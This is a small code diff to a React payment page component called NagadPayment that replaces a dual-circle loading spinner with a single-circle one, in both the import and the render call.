@@ -3,7 +3,7 @@ import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import { useReferrerGuard } from "@/hooks/useReferrerGuard";
-import DualCircleLoader from "@/components/DualCircleLoader";
+import SingleCircleLoader from "@/components/SingleCircleLoader";
 import cartIcon from "@/assets/cart-icon.png";
 import nagadLogoWhite from "@/assets/nagad-logo-white.png";
 import CancelPaymentDialog from "@/components/CancelPaymentDialog";
@@ -230,7 +230,7 @@ const NagadPayment = () => {
 
   return (
     <div className="h-[100dvh] w-screen flex items-center justify-center bg-gray-300 overflow-hidden">
-      {isLoading && <DualCircleLoader spinnerClassName="h-6 w-6 border-[3.5px] text-destructive min-[375px]:h-7 min-[375px]:w-7" />}
+      {isLoading && <SingleCircleLoader />}
       <div className="w-full max-w-[430px] h-full flex flex-col overflow-hidden border-4 min-[375px]:border-[8px] border-black"
         style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
         
